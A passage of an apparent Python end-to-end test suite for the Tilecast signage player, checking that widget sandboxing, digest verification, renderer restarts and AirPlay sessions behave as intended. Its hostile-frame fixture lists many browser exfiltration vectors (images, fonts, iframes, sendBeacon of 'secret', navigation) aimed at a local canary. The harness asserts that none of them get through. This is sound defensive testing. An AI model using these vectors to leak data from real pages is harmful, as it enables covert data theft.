  function add(el) { (document.body || document.documentElement).appendChild(el); }
  aim("img", function (u) { new Image().src = u; });
  aim("srcset", function (u) { new Image().srcset = u + " 1x"; });
  aim("video", function (u) { var v = document.createElement("video"); v.preload = "auto"; v.src = u; add(v); });
  aim("audio", function (u) { var a = new Audio(); a.preload = "auto"; a.src = u; });
  aim("poster", function (u) { var v = document.createElement("video"); v.poster = u; add(v); });
  aim("css", function (u) {
    var d = document.createElement("div");
    d.style.cssText = "width:10px;height:10px;background-image:url(" + u + ")";
    add(d);
  });
  aim("font", function (u) {
    var s = document.createElement("style");
    s.textContent = "@font-face{font-family:x;src:url(" + u + ")}.tcx{font-family:x}";
    document.head.appendChild(s);
    var d = document.createElement("span"); d.className = "tcx"; d.textContent = "x"; add(d);
  });
  aim("stylesheet", function (u) { var l = document.createElement("link"); l.rel = "stylesheet"; l.href = u; document.head.appendChild(l); });
  aim("preload", function (u) { var l = document.createElement("link"); l.rel = "preload"; l.as = "image"; l.href = u; document.head.appendChild(l); });
  aim("prefetch", function (u) { var l = document.createElement("link"); l.rel = "prefetch"; l.href = u; document.head.appendChild(l); });
  aim("object", function (u) { var o = document.createElement("object"); o.data = u; add(o); });
  aim("embed", function (u) { var e = document.createElement("embed"); e.src = u; add(e); });
  aim("iframe", function (u) { var f = document.createElement("iframe"); f.src = u; add(f); });
  aim("beacon", function (u) { navigator.sendBeacon(u, "secret"); });
  // A default-world native handler would let a frame replace the live
  // Runtime support report. The test requires the real Widget ABI below.
  var handlers = window.webkit && window.webkit.messageHandlers;
  if (handlers && handlers.tilecast) {
    handlers.tilecast.postMessage({type: "runtime.ready", support: {
      presentationSchemas: [], declarativeCapabilities: {}, widgetComponents: {}
    }});
  }
  // CSP fetch directives do not contain self-navigation. The native policy
  // must refuse it before the reachable canary receives a request.
  setTimeout(function () { try { window.location.href = canary + "/navigation?d=secret"; } catch (err) {} }, 200);
})(%s);
"""


EXFIL_OBSERVATION_SECONDS = 5.0


def png_bytes():
    """A decodable 1x1 PNG, hand-rolled so the test needs no image tools."""
    import struct
    import zlib

    def chunk(kind, payload):
        return struct.pack(">I", len(payload)) + kind + payload + struct.pack(">I", zlib.crc32(kind + payload))
    header = struct.pack(">IIBBBBB", 1, 1, 8, 6, 0, 0, 0)
    raw = b"\x00\x00\x00\xff\xff"  # filter + one opaque blue pixel
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", header)
        + chunk(b"IDAT", zlib.compress(raw))
        + chunk(b"IEND", b"")
    )


class WidgetState:
    def __init__(self, installation, screen, server_url):
        self.installation = installation
        self.screen = screen
        self.canary = f"{server_url}/api/v1/player/probe-exfil"
        self.frame = build_frame_document("bundle.js")
        self.frame_hex = hashlib.sha256(self.frame).hexdigest()
        self.evil = build_frame_document("hostile.js", PASSIVE_VECTORS % json.dumps(self.canary))
        self.evil_hex = hashlib.sha256(self.evil).hexdigest()
        self.package_hex = hashlib.sha256(b"acme-athletics-package").hexdigest()
        self.evil_package_hex = hashlib.sha256(b"acme-evil-package").hexdigest()
        self.png = png_bytes()
        self.png_hex = hashlib.sha256(self.png).hexdigest()
        self.widget_a = str(uuid.uuid4())
        self.widget_b = str(uuid.uuid4())
        self.hostile = str(uuid.uuid4())
        self.hero = str(uuid.uuid4())
        self.hero_variant = str(uuid.uuid4())
        self.document_id = str(uuid.uuid4())
        self.layout_id = str(uuid.uuid4())
        self.item_full = str(uuid.uuid4())
        self.item_layout = str(uuid.uuid4())
        self.revision = 1
        self.tamper = False
        self.lock = threading.Lock()
        self.heartbeats = []
        self.frame_requests = 0
        self.evil_requests = 0
        self.media_requests = 0
        self.exfil_hits = 0
        self.exfil_paths = []

    @property
    def etag(self):
        return f'"manifest-{self.revision}"'

    def _component(self, widget, label, package, digest_hex, frame_hex, frame_size, frame_path, hostile=False):
        if hostile:
            config = {"exfil": self.canary}
            data_sources, media = [], []
            component_type, version = "acme.evil.probe", 1
        else:
            config = {"label": label, "mediaAssetId": self.hero, "mediaVariantId": self.hero_variant,
                      "documentId": self.document_id}
            data_sources, media = [self.document_id], [{"assetId": self.hero, "variantId": self.hero_variant}]
            component_type, version = "acme.athletics.scoreboard", 2
        capability = 3 if self.revision == 2 else 2
        return {
            "assetId": widget, "name": label, "provider": component_type,
            "configVersion": 1, "configuration": {},
            "presentation": {
                "schemaVersion": 3, "kind": "component",
                "requiredCapabilities": {"widget.external-runtime": capability},
                "component": {
                    "type": component_type, "version": version, "config": config,
                    "dataSources": data_sources, "media": media, "empty": "render",
                    "package": {
                        "packageId": package, "digest": f"sha256:{digest_hex}",
                        "frame": {"sha256": frame_hex, "fileSize": frame_size, "downloadPath": frame_path},
                    },
                },
            },
        }

    def manifest(self):
        frame_path = f"/api/v1/player/packages/{WIDGET_PACKAGE}/widgets/{WIDGET_ID}/frame"
        evil_path = f"/api/v1/player/packages/{EVIL_PACKAGE}/widgets/{EVIL_ID}/frame"
        claimed, claimed_hex = self.frame, self.frame_hex
        if self.tamper:
            # Claim bytes the origin then corrupts: the fetch must fail
            # digest verification and the committed presentation must stay.
            tampered = bytearray(self.frame)
            tampered[len(tampered) // 2] ^= 0xFF
            claimed, claimed_hex = bytes(tampered), hashlib.sha256(bytes(tampered)).hexdigest()
        return {
            "schemaVersion": 19, "manifestVersion": self.revision, "screenId": self.screen,
            "generatedAt": "2026-10-08T00:00:00Z", "mode": "presentation",
            "assets": [{
                "assetId": self.hero, "variantId": self.hero_variant, "mimeType": "image/png",
                "sha256": self.png_hex, "fileSize": len(self.png),
                "downloadPath": f"/api/v1/player/assets/{self.hero}/variants/{self.hero_variant}",
            }],
            "playlist": {"id": str(uuid.uuid4()), "revision": 1, "name": "Widgets", "items": [
                {"id": self.item_full, "assetId": self.widget_a, "assetType": "widget",
                 "durationMs": 20000, "fitMode": "contain", "transition": "none",
                 "audioEnabled": False, "volume": 0.0, "deliveryPolicy": "download"},
                {"id": self.item_layout, "assetId": self.layout_id, "layoutId": self.layout_id,
                 "assetType": "layout", "durationMs": 20000, "fitMode": "contain", "transition": "none",
                 "audioEnabled": False, "volume": 0.0, "deliveryPolicy": "stream"},
            ]},
            "playlists": [], "schedules": [], "websites": [],
            "widgets": [
                self._component(self.widget_a, "Lobby", WIDGET_PACKAGE, self.package_hex,
                               claimed_hex, len(claimed), frame_path),
                self._component(self.widget_b, "Zone", WIDGET_PACKAGE, self.package_hex,
                               claimed_hex, len(claimed), frame_path),
                self._component(self.hostile, "Probe", EVIL_PACKAGE, self.evil_package_hex,
                               self.evil_hex, len(self.evil), evil_path, hostile=True),
            ],
            "dataSources": [{
                "id": self.document_id, "name": "Schedule", "provider": "test",
                "configVersion": 1, "configuration": {},
                "dataDocument": {"schemaVersion": 1, "datasets": [{"label": "Week 1"}]},
            }],
            "plugins": [],
            "layouts": [{
                "id": self.layout_id, "revisionId": str(uuid.uuid4()), "revision": 1,
                "documentSha256": hashlib.sha256(b"widget-layout").hexdigest(),
                "document": {
                    "schemaVersion": 2,
                    "canvas": {"width": 1920, "height": 1080, "orientation": "landscape",
                               "backgroundColor": "#000000"},
                    "placements": [
                        {"id": "zone-scores", "type": "widget", "name": "Scores", "x": 0, "y": 0,
                         "width": 960, "height": 1080, "layer": 0, "opacity": 1,
                         "visible": True, "locked": False, "widgetId": self.widget_b},
                        {"id": "zone-probe", "type": "widget", "name": "Probe", "x": 960, "y": 0,
                         "width": 960, "height": 1080, "layer": 0, "opacity": 1,
                         "visible": True, "locked": False, "widgetId": self.hostile},
                    ],
                },
            }],
            "prefetchHorizonDays": 14, "activationGraceSeconds": 3600,
        }


class WidgetHandler(http.server.BaseHTTPRequestHandler):
    server_version = "TilecastWidgetFake/1"

    def log_message(self, *args):
        pass

    @property
    def state(self):
        return self.server.widget_state

    def _send_json(self, code, obj):
        body = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_bytes(self, body, content_type):
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Accept-Ranges", "bytes")
        self.end_headers()
        self.wfile.write(body)

    def _read_json(self):
        length = int(self.headers.get("Content-Length", "0") or 0)
        raw = self.rfile.read(length) if length else b"{}"
        return json.loads(raw or b"{}")

    def _authorized(self):
        return self.headers.get("Authorization") == f"Bearer {STREAM_CREDENTIAL}"

    def _deny(self):
        self._send_json(401, {"error": {"code": "device_credential_invalid", "message": "rejected"}})

    def _frame_response(self, body, counter):
        with self.state.lock:
            setattr(self.state, counter, getattr(self.state, counter) + 1)
        if self.state.tamper and counter == "frame_requests":
            # Serve bytes that do not match the claimed digest.
            flipped = bytearray(body)
            flipped[100] ^= 0x01
            body = bytes(flipped)
        self._send_bytes(body, "text/html")

    def _exfil(self):
        """Records a canary hit by any method; the hostile frame must never land one."""
        if not self.path.startswith("/api/v1/player/probe-exfil"):
            return False
        with self.state.lock:
            self.state.exfil_hits += 1
            self.state.exfil_paths.append(f"{self.command} {self.path}")
        length = int(self.headers.get("Content-Length", "0") or 0)
        if length:
            self.rfile.read(length)
        self._send_json(200, {"data": {}})
        return True

    def do_GET(self):  # noqa: N802
        if self._exfil():
            return None
        if self.path == "/api/v1/system/identity":
            return self._send_json(200, {"data": {
                "product": "tilecast", "installationId": self.state.installation,
                "organizationName": "Widget Test", "apiVersion": "v1", "pairingEnabled": False,
            }})
        if not self._authorized():
            return self._deny()
        if self.path == "/api/v1/player/manifest":
            if self.headers.get("If-None-Match") == self.state.etag:
                self.send_response(304)
                self.end_headers()
                return
            body = json.dumps({"data": self.state.manifest()}).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("ETag", self.state.etag)
            self.end_headers()
            self.wfile.write(body)
            return
        if self.path == "/api/v1/player/config":
            # Fast reconciliation: revisions land within about a minute.
            return self._send_json(200, {"data": {
                "schemaVersion": 1, "configRevision": 1,
                "sync": {"statusReportSeconds": 15, "manifestReconciliationSeconds": 60},
            }})
        if self.path == "/api/v1/player/commands":
            return self._send_json(200, {"data": {"items": []}})
        if self.path == f"/api/v1/player/packages/{WIDGET_PACKAGE}/widgets/{WIDGET_ID}/frame":
            return self._frame_response(self.state.frame, "frame_requests")
        if self.path == f"/api/v1/player/packages/{EVIL_PACKAGE}/widgets/{EVIL_ID}/frame":
            return self._frame_response(self.state.evil, "evil_requests")
        if self.path == f"/api/v1/player/assets/{self.state.hero}/variants/{self.state.hero_variant}":
            with self.state.lock:
                self.state.media_requests += 1
            return self._send_bytes(self.state.png, "image/png")
        return self._send_json(404, {"error": {"code": "not_found", "message": "no such path"}})

    def do_POST(self):  # noqa: N802
        if self._exfil():
            return None
        if not self._authorized():
            self._read_json()
            return self._deny()
        if self.path == "/api/v1/player/heartbeat":
            payload = self._read_json()
            with self.state.lock:
                self.state.heartbeats.append(payload)
            return self._send_json(200, {"data": {}})
        if self.path == "/api/v1/player/liveness":
            self._read_json()
            return self._send_json(200, {"data": {}})
        if self.path == "/api/v1/player/telemetry":
            self._read_json()
            return self._send_json(200, {"data": {"accepted": True}})
        if self.path == "/api/v1/player/activity-events":
            batch = self._read_json()
            events = batch.get("events", [])
            return self._send_json(200, {"data": {
                "accepted": len(events),
                "acknowledgedEventIds": [e.get("id") for e in events],
            }})
        self._read_json()
        return self._send_json(404, {"error": {"code": "not_found", "message": "no such path"}})

    # The canary accepts any method a hostile frame might use.
    do_PUT = do_POST
    do_PATCH = do_POST


def media_socket_ask(runtime_dir, request):
    """One raw media-channel request, framed exactly like the C client."""
    import socket
    import struct

    path = os.path.join(runtime_dir, "media.sock")
    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as sock:
        sock.settimeout(10)
        sock.connect(path)
        body = json.dumps(request).encode("utf-8")
        sock.sendall(struct.pack(">I", len(body)) + body)
        header = sock.recv(4)
        (length,) = struct.unpack(">I", header)
        reply = b""
        while len(reply) < length:
            chunk = sock.recv(length - len(reply))
            if not chunk:
                break
            reply += chunk
        return json.loads(reply)


def assert_no_exfil(state, window=EXFIL_OBSERVATION_SECONDS):
    """Watches the canary for a bounded window instead of one instant.

    The probe reports ready once its fetch settles, but media preload,
    prefetch, nested frames and objects keep loading after that, so a late
    canary request would land after a single check.
    """
    deadline = time.monotonic() + window
    while True:
        with state.lock:
            hits, paths = state.exfil_hits, list(state.exfil_paths)
        assert hits == 0, f"the hostile frame reached the network: {paths}"
        if time.monotonic() >= deadline:
            return
        time.sleep(0.25)


def scenario_widget(args):
    with tempfile.TemporaryDirectory() as workdir:
        installation = str(uuid.uuid4())
        screen = str(uuid.uuid4())
        # The socket is bound before serving starts, so the hostile frame can
        # bake the reachable canary URL into its passive-vector probe.
        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), WidgetHandler)
        server_url = f"http://127.0.0.1:{server.server_address[1]}"
        server.widget_state = WidgetState(installation, screen, server_url)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        stack = Stack(args, workdir)
        try:
            stack.start_daemon()
            stack.stop()
            inject_pairing(workdir, server_url, installation, screen)
            stack.start_daemon()
            stack.start_renderer()
            state = server.widget_state
            wait_for("the healthy renderer", lambda: healthy(stack), timeout=90)
            # Every Widget instance reports: the fullscreen scoreboard by
            # item, both Layout zones by zone. Each ready gates on config,
            # documents, granted media bytes, and a sane clock.
            wait_for("the fullscreen Widget evidence",
                     lambda: [e for e in accepted_evidence(stack)
                              if e[0] == "widget_shown" and e[1] == state.item_full], timeout=180, interval=1)
            zones = wait_for(
                "both Widget Layout zones rendered",
                lambda: (lambda z: z if {"zone-scores", "zone-probe"} <= z else None)(
                    {e[2] for e in accepted_evidence(stack) if e[0] == "layout_zone_rendered"}),
                timeout=180, interval=1)
            presentation = wait_for(
                "the Widget presentation accepted with evidence",
                lambda: (lambda p: p if p and p["accepted"] and p["evidence"] else None)(
                    stack.status().get("presentation")),
                timeout=60)
            assert presentation["source"] == "server_manifest", presentation
            generation = presentation["generation"]
            with state.lock:
                assert state.frame_requests > 0, "the scoreboard frame was never fetched"
                assert state.evil_requests > 0, "the hostile frame was never fetched"
                assert state.media_requests > 0, "the granted Widget media was never prepared"
                assert state.exfil_hits == 0, f"the hostile frame reached the network: {state.exfil_paths}"
                beats = [b for b in state.heartbeats
                         if b.get("nativePresentationCapabilities", {}).get("widget.external-runtime") == 2]
                assert beats, "no heartbeat advertised the frame execution ABI"
            print(f"widget: zones {sorted(zones)} rendered, frames verified, ABI advertised")
            with open(os.path.join(workdir, "tilecastd.log"), encoding="utf-8", errors="replace") as handle:
                daemon_log = handle.read()
            with open(os.path.join(workdir, "renderer.log"), encoding="utf-8", errors="replace") as handle:
                renderer_log = handle.read()
            # Renderer-visible surfaces stay opaque: no download paths, no
            # credential, and the hostile fetch died in the sandbox.
            assert "/api/v1/player/packages" not in renderer_log, "frame paths leaked to the renderer"
            assert STREAM_CREDENTIAL not in renderer_log, "credential leaked to the renderer"
            assert STREAM_CREDENTIAL not in daemon_log, "credential leaked to the daemon log"
            assert state.frame.decode("utf-8").count(STREAM_CREDENTIAL) == 0
            # The hostile fetch was attempted and contained: the probe only
            # reports ready once its fetch settles, zone-probe rendered, and
            # the canary saw no hit. (WebKit never writes page console
            # messages for an ephemeral session, so the renderer log holds
            # no CSP trace to look for.)
            assert "zone-probe" in zones, "the hostile probe never settled its fetch"
            assert_no_exfil(state)
            # The media socket refuses unknown capabilities with a bare
            # denial. (Retired-vs-unknown attribution is daemon-side and
            # covered by the registry unit test; this probe cannot pass
            # the renderer's peer-lineage check by design.)
            denied = media_socket_ask(os.path.join(workdir, "run"),
                                      {"op": "head", "capability": "0" * 64, "expect": "frame"})
            assert denied == {"status": "denied"}, denied
            print("widget: unknown frame capability denied bare; no leaks in renderer surfaces")

            # Killing the renderer disturbs nothing: the replacement shows
            # the same activation and the Widgets report again.
            mark = log_lines(stack)
            stack.renderer.send_signal(signal.SIGKILL)
            stack.renderer.wait(timeout=10)
            stack.start_renderer()
            wait_for("the healthy renderer again", lambda: healthy(stack), timeout=90)
            wait_for("Widget evidence after the renderer restart",
                     lambda: [e for e in accepted_evidence(stack, mark) if e[0] == "widget_shown"],
                     timeout=180, interval=1)
            # The restarted renderer loads the hostile frame again and replays
            # every passive vector, so the canary stays under watch.
            wait_for("the hostile probe zone after the renderer restart",
                     lambda: [e for e in accepted_evidence(stack, mark)
                              if e[0] == "layout_zone_rendered" and e[2] == "zone-probe"],
                     timeout=180, interval=1)
            assert_no_exfil(state)
            assert stack.status()["presentation"]["generation"] == generation, "activation changed"
            print("widget: renderer restart kept the activation and the Widgets reported again")

            # An ABI the host cannot run never blanks the screen: the new
            # revision fails with its reason and the committed Widgets play on.
            with state.lock:
                state.revision = 2
            wait_for("the incompatible revision refused",
                     lambda: [b for b in state.heartbeats
                              if b.get("lastSynchronizationError")
                              == "presentation_incompatible_widget_capability"], timeout=180, interval=2)
            assert stack.status()["presentation"]["generation"] == generation, "incompatible took over"
            assert healthy(stack) is not None, "renderer left healthy state"
            print("widget: external-runtime@3 refused, committed Widgets kept playing")

            # Corrupt frame bytes fail verification; the committed Widgets
            # play on with the named reason.
            with state.lock:
                state.revision = 3
                state.tamper = True
            wait_for("the corrupt frame refused",
                     lambda: [b for b in state.heartbeats
                              if b.get("lastSynchronizationError") == "widget_frame_digest_invalid"],
                     timeout=180, interval=2)
            assert stack.status()["presentation"]["generation"] == generation, "corrupt revision took over"
            print("widget: corrupt frame bytes refused with widget_frame_digest_invalid")

            # The origin goes away: prepared frame bytes keep playing from
            # the cache with the presentation still accepted.
            server.shutdown()
            thread.join(timeout=10)
            time.sleep(5)
            status = stack.status()
            assert status["presentation"]["accepted"], "cached Widgets stopped while offline"
            assert status["renderer"]["state"] == "healthy", status["renderer"]
            print("widget: cached frames kept playing with the origin gone")
        except Exception:
            stack.dump_logs()
            raise
        finally:
            server.shutdown()
            thread.join(timeout=10)
            stack.stop()


AIRPLAY_SESSION = "3f2504e0-4f89-41d3-9a0c-0305e82c3301"
# Test-only values, distinctive enough to search for.
AIRPLAY_PIN = "8264"
AIRPLAY_DEVICE = "02:82:64:5a:6b:7c"
AIRPLAY_WORK = "/var/tmp/tilecast-airplay-present-e2e"
AIRPLAY_FAKE_CMD = "/run/tilecast-airplay-session/fake-uxplay.cmd"


class AirplayState:
    def __init__(self, installation, screen):
        self.installation = installation
        self.screen = screen
        self.lock = threading.Lock()
        self.commands = []
        self.results = {}
        self.heartbeats = []
        self.previews = 0
        self.refused_previews = 0

    def manifest(self):
        now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        return {
            "schemaVersion": 11, "manifestVersion": 1, "screenId": self.screen, "generatedAt": now,
            "serverTime": now, "mode": "presentation", "assets": [],
            "playlist": {"id": str(uuid.UUID(int=7)), "revision": 1, "name": "Lobby", "items": []},
            "playlists": [], "schedules": [], "websites": [], "widgets": [], "dataSources": [], "plugins": [],
            "layouts": [], "prefetchHorizonDays": 14, "activationGraceSeconds": 3600,
        }

    def offer(self, command_type, payload):
        command_id = str(uuid.uuid4())
        with self.lock:
            self.commands.append({"id": command_id, "type": command_type, "idempotencyKey": str(uuid.uuid4()),
                                  "payload": payload, "state": "delivered"})
        return command_id

    def result(self, command_id):
        with self.lock:
            return self.results.get(command_id)

    def last_heartbeat(self):
        with self.lock:
            return self.heartbeats[-1] if self.heartbeats else {}


class AirplayHandler(StreamHandler):
    server_version = "TilecastAirplayFake/1"

    @property
    def state(self):
        return self.server.airplay_state

    def do_GET(self):  # noqa: N802
        if self.path == "/api/v1/system/identity":
            return self._send_json(200, {"data": {
                "product": "tilecast", "installationId": self.state.installation,
                "organizationName": "AirPlay Test", "apiVersion": "v1", "pairingEnabled": False,
            }})
        if not self._authorized():
            return self._deny()
        if self.path == "/api/v1/player/manifest":
            return self._send_json(200, {"data": self.state.manifest()}, [("ETag", '"airplay-1"')])
        if self.path == "/api/v1/player/config":
            return self._send_json(200, {"data": {"schemaVersion": 1, "configRevision": 1}})
        if self.path == "/api/v1/player/commands":
            with self.state.lock:
                items = [c for c in self.state.commands if c["state"] in ("delivered", "acknowledged")]
            return self._send_json(200, {"data": {"items": items}})
        if self.path == "/api/v1/player/preview-session":
            return self._send_json(200, {"data": {"active": True, "captureIntervalSeconds": 5, "captureNow": True}})
        if self.path == "/api/v1/player/live-stream-session":
            return self._send_json(200, {"data": {"active": False}})
        return self._send_json(404, {"error": {"code": "not_found", "message": "no such path"}})

    def do_POST(self):  # noqa: N802
        if self._authorized() and self.path.startswith("/api/v1/player/commands/"):
            command_id, action = self.path[len("/api/v1/player/commands/"):].split("/", 1)
            body = self._read_json()
            with self.state.lock:
                entry = next((c for c in self.state.commands if c["id"] == command_id), None)
                if entry is None:
                    return self._send_json(409, {"error": {"code": "command_expired", "message": "gone"}})
                if action == "acknowledge" and entry["state"] == "delivered":
                    entry["state"] = "acknowledged"
                elif action == "result":
                    entry["state"] = "succeeded" if body.get("success") else "failed"
                    self.state.results[command_id] = body
                return self._send_json(200, {"data": {"id": command_id, "state": entry["state"]}})
        if self._authorized() and self.path == "/api/v1/player/preview":
            length = int(self.headers.get("Content-Length", "0") or 0)
            body = self.rfile.read(length)
            # Only an upload with a JPEG is a captured frame; a refused
            # capture is reported as unavailable, without an image.
            with self.state.lock:
                if b"\xff\xd8\xff" in body:
                    self.state.previews += 1
                else:
                    self.state.refused_previews += 1
            self.send_response(204)
            self.end_headers()
            return None
        if self._authorized() and self.path == "/api/v1/player/heartbeat":
            payload = self._read_json()
            with self.state.lock:
                self.state.heartbeats.append(payload)
            return self._send_json(200, {"data": {}})
        return super().do_POST()


def airplay_journal(unit):
    return subprocess.run(["journalctl", "--no-pager", "-o", "cat", "-u", unit], capture_output=True,
                          text=True, check=False).stdout


def airplay_command(state, command_type, payload, timeout=90):
    command_id = state.offer(command_type, payload)
    return wait_for(f"{command_type} result", lambda: state.result(command_id), timeout=timeout)


def airplay_fake(line):
    with open(AIRPLAY_FAKE_CMD, "a", encoding="utf-8") as handle:
        handle.write(line + "\n")


def scenario_airplay(args):
    if os.geteuid() != 0 or not os.path.isdir("/run/systemd/system"):
        raise AssertionError("the airplay scenario needs root and systemd as PID 1 (ci/run-airplay-e2e.sh)")
    import importlib.util
    helper = importlib.util.spec_from_file_location("airplay_e2e", "/src/apps/edge/ci/airplay_e2e.py")
    airplay_e2e = importlib.util.module_from_spec(helper)
    helper.loader.exec_module(airplay_e2e)
    # The supervisor, its socket and service units, its account, and the
    # fake UxPlay, exactly as the Stage 2 systemd test installs them.
    airplay_e2e.setup()
    # UxPlay advertises through the host's avahi-daemon; the probe requires it.
    subprocess.run(["systemctl", "start", "avahi-daemon.service"], check=True)
    sender_spec = importlib.util.spec_from_file_location(
        "present_sender", "/src/apps/edge/renderer-wpe/spike/present-latency/sender.py")
    sender = importlib.util.module_from_spec(sender_spec)
    sender_spec.loader.exec_module(sender)

    shutil.rmtree(AIRPLAY_WORK, ignore_errors=True)
    os.makedirs(AIRPLAY_WORK)
    installation, screen = str(uuid.uuid4()), str(uuid.uuid4())
    state = AirplayState(installation, screen)
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), AirplayHandler)
    server.airplay_state = state
    server_url = f"http://127.0.0.1:{server.server_address[1]}"
    threading.Thread(target=server.serve_forever, daemon=True).start()
    stack = Stack(args, AIRPLAY_WORK)
    stack.start_daemon()
    stack.stop()
    inject_pairing(AIRPLAY_WORK, server_url, installation, screen)
    video = os.path.join(AIRPLAY_WORK, "phases.h264")
    subprocess.run([
        "ffmpeg", "-loglevel", "error", "-y", "-f", "lavfi", "-i", "testsrc2=s=1280x720:r=30:d=4",
        "-c:v", "libx264", "-profile:v", "baseline", "-tune", "zerolatency", "-g", "30",
        "-x264-params", "repeat-headers=1", "-bsf:v", "h264_metadata=aud=insert", "-f", "h264", video,
    ], check=True)
    subprocess.run(["chown", "-R", "tilecast:tilecast", AIRPLAY_WORK], check=True)
    for unit in ("tilecast-edge.service", "tilecast-renderer.service"):
        subprocess.run(["systemctl", "stop", unit], check=False, capture_output=True)
        subprocess.run(["systemctl", "reset-failed", unit], check=False, capture_output=True)
    common = ["systemd-run", "--uid=tilecast", "--gid=tilecast", "--property=Type=exec", "--collect", "--quiet"]
    subprocess.run(common + [
        "--unit=tilecast-edge.service",
        os.path.join(args.bin_dir, "tilecastd"), "--config", stack.config, "run",
    ], check=True)
    run_dir = os.path.join(AIRPLAY_WORK, "run")
    wait_for("daemon socket", lambda: os.path.exists(stack.socket), timeout=60)
    home = os.path.join(AIRPLAY_WORK, "renderer-home")
    os.makedirs(home, exist_ok=True)
    subprocess.run(["chown", "tilecast:tilecast", home], check=True)
    # WebKit's bubblewrap sandbox stays on: the renderer's relay is the only
    # way the web process, in its own network namespace, gets the stream. A
    # host that cannot give an unprivileged account user namespaces can run
    # the scenario with E2E_DISABLE_WEBKIT_SANDBOX=1 (never the default), as
    # ci/migrate_e2e.py allows.
    sandbox = []
    probe = subprocess.run(["runuser", "-u", "tilecast", "--", "bwrap", "--unshare-user", "--unshare-net",
                            "--dev-bind", "/", "/", "/bin/true"], capture_output=True, text=True)
    if probe.returncode != 0:
        if os.environ.get("E2E_DISABLE_WEBKIT_SANDBOX") != "1":
            raise AssertionError("this host cannot run WebKit's sandbox for the tilecast account: "
                                 + probe.stderr.strip() + " (E2E_DISABLE_WEBKIT_SANDBOX=1 opts out)")
        print("airplay: WebKit sandbox deliberately disabled for this run (E2E_DISABLE_WEBKIT_SANDBOX=1)")
        sandbox = ["--setenv=WEBKIT_DISABLE_SANDBOX_THIS_IS_DANGEROUS=1"]
    subprocess.run(common + sandbox + [
        "--unit=tilecast-renderer.service", f"--setenv=HOME={home}", f"--setenv=XDG_CACHE_HOME={home}",
        f"--setenv=XDG_RUNTIME_DIR={home}", "--setenv=GST_DEBUG=GST_STATES:4",
        args.renderer, "--platform=headless", f"--socket={stack.socket}",
        f"--media-socket={os.path.join(run_dir, 'media.sock')}", f"--runtime-dir={args.runtime_dir}",
        f"--gst-plugin-dir={args.gst_plugin_dir}", "--headless-size=1280x720", "--console",
    ], check=True)
    try:
        wait_for("a renderer with the AirPlay feature", lambda: (
            state.last_heartbeat().get("airplaySupported") is True and state.last_heartbeat()), timeout=120)
        heartbeat = state.last_heartbeat()
        assert heartbeat["airplayGroupSupported"] is False, heartbeat
        assert heartbeat.get("airplayDecoder"), heartbeat
        print(f"airplay: supported with {heartbeat['airplayDecoder']}; group sessions refused")
        wait_for("a preview of the signage", lambda: state.previews > 0, timeout=90)

        expires = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + 1800))
        payload = {
            "provider": "airplay", "sessionId": AIRPLAY_SESSION, "role": "single", "phase": "start",
            "targetType": "screen", "targetId": screen, "gatewayScreenId": screen, "audioScreenId": screen,
            "receiverName": "E2E Lobby", "pin": AIRPLAY_PIN, "deviceId": AIRPLAY_DEVICE, "expiresAt": expires,
            "transport": "unicast", "videoPort": 42000, "audioPort": 42002, "destinations": [],
            "multicastAddress": "", "profile": "720p30", "audioMode": "gateway_only",
        }
        result = airplay_command(state, "prepare_airplay_session", payload)
        assert result["success"] and result["code"] == "airplay_started", result
        wait_for("the relay", lambda: "present-relay: relaying (audio on)" in airplay_journal(
            "tilecast-renderer.service"), timeout=30)
        wait_for("the waiting session in the heartbeat", lambda: (
            state.last_heartbeat().get("externalPresentationState") == "waiting"), timeout=60)
        print("airplay: prepared; UxPlay advertises; the renderer relays the granted stream")

        airplay_fake("mirroring")
        wait_for("the connected session in the heartbeat", lambda: (
            state.last_heartbeat().get("airplayConnected") is True), timeout=60)
        previews, refused = state.previews, state.refused_previews
        stop = threading.Event()
        threading.Thread(target=sender.audio_loop, args=(stop,), daemon=True).start()
        out = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        with open(video, "rb") as handle:
            units = sender.access_units(handle.read())
        started, sequence = time.monotonic(), 0
        for index in range(30 * 12):
            unit = units[index % len(units)]
            delay = started + index / 30 - time.monotonic()
            if delay > 0:
                time.sleep(delay)
            payloads = sender.packetize(unit)
            for number, chunk in enumerate(payloads):
                header = sender.rtp_header(number == len(payloads) - 1, 96, sequence, index * 3000, 0x5A5A0001)
                out.sendto(header + chunk, ("127.0.0.1", 42000))
                sequence += 1
        stop.set()
        journal = airplay_journal("tilecast-renderer.service")
        playing = [line for line in journal.splitlines() if "completed state change to PLAYING" in line]
        # playbin names the tcpresent bin `source`; its own elements keep their
        # names, so they show that the relayed RTP reached the web process.
        for element in ("<unixfdsrc", "<rtph264depay", "<rtpl16depay", "<avdec_h264"):
            assert any(element in line for line in playing), f"{element[1:]} never played in the web process"
        print("airplay: the Runtime decoded the forwarded H.264 stream" + (" (WebKit sandbox off)" if sandbox else " (WebKit sandbox on)"))
        wait_for("a refused capture during the session", lambda: state.refused_previews > refused, timeout=30)
        assert state.previews == previews, "a preview frame was captured during the session"
        print("airplay: preview captures were refused while the session ran")

        airplay_fake("disconnect")
        wait_for("the ready page again", lambda: (
            state.last_heartbeat().get("airplayConnected") is False
            and state.last_heartbeat().get("externalPresentationState") == "waiting"), timeout=60)
        result = airplay_command(state, "stop_airplay_session", {"sessionId": AIRPLAY_SESSION})
        assert result["code"] == "airplay_stopped", result
        wait_for("the stopped session in the heartbeat", lambda: (
            state.last_heartbeat().get("externalPresentationState") == "none"), timeout=60)
        wait_for("the relay stopped", lambda: "present-relay: stopped" in airplay_journal(
            "tilecast-renderer.service"), timeout=30)
        wait_for("previews again after the stop", lambda: state.previews > previews, timeout=90)
        for unit in ("tilecast-edge.service", "tilecast-airplay.service"):
